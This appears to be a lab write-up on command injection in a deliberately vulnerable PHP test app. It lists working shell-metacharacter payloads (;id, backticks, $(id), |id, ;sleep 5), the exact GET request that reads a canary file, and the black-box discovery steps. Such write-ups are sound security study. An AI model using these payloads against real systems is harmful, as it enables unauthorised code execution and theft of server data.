# Shakedown target - OS Command Injection (RCE)

## Result
Canary exfiltrated over HTTP on first working payload:

```
FLAG{shakedown:a28ce55aa86ce1ae8dbc001e03832d73}
```

## Root cause
The index page advertises `act=preview&host=...`. The `host` GET parameter is
interpolated **unsanitized** into a shell command line on the server (the
response body is the command's stdout). Every classic shell metacharacter
reached a subshell as `www-data`:

- `;id`        -> `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- `` `id` ``   -> same
- `$(id)`      -> same
- `|id`        -> same
- `;sleep 5`   -> response delayed by exactly ~5.0s (timing oracle confirms execution)

Because the application returns the **stdout of the injected command** in the
HTTP response body, the bug is a full, directly-observable RCE (blind
techniques were never needed).

## Exploit
```
GET /?act=preview&host=%3Bcat%20/CANARY
```
i.e. `host=";cat /CANARY"` - the `;` closes the intended host-preview command
and `cat /CANARY` prints the canary into the response body.

## Preconditions
- Only that the `act=preview` endpoint exists and `host` is attacker-controlled
  (it is, by design - this is the pipeline-validation target).
- No authentication, no POST, no special headers. Works with plain GET.

## How I found it (black-box, ~4 requests)
1. `curl /` → banner: `shakedown target. act=preview&host=... (vulnerable by design)`, `X-Powered-By: PHP/8.3.35`.
2. `?act=preview&host=localhost` → body echoed `localhost` (could be plain echo; needed to distinguish echo from execution).
3. Sent `;id`, `` `id` ``, `$(id)`, `|id` → all returned genuine `uid=33(www-data)` output ⇒ command injection, not string echo.
4. Confirmed with a `;sleep 5` timing delay (~5.0s) to rule out any input-reflection illusion.
5. `;cat /CANARY` → flag in response body. Done.

## Affected surface
- This is the deliberately vulnerable sample app in `range/shakedown` (php:8.3-apache image, PHP 8.3.35, Apache 2.4.68, Debian). It is not a PHP core bug; it is an application-level command injection (pattern: `exec("... $host ...")` / `shell_exec` / backticks with GET input spliced into the string). The same app pattern would be exploitable on any PHP version.

## Notes
- The canary was returned through the HTTP-visible response channel as the
  stdout of the injected `cat /CANARY` - not an echo of attacker input.
- No persistence, no lateral movement, no DoS: a single GET request; the only
  side effect is reading the canary file.
